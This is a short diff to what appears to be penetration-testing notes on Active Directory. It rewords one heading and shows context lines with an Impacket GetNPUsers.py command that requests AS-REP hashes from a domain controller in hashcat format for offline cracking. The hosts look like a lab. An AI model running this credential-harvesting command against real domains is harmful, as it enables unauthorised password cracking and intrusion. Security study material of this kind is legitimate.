@@ -6,7 +6,7 @@
 **-format hashcat to export a formated hash**
 {% endhint %}
 
-### Account with doesn't require Kerberos Auth
+### Account witch doesn't require Kerberos Authentication
 
 ```csharp
 ./GetNPUsers.py -dc-ip 10.110.0.222 -request 'crook.badcorp.local/' -format hashcat
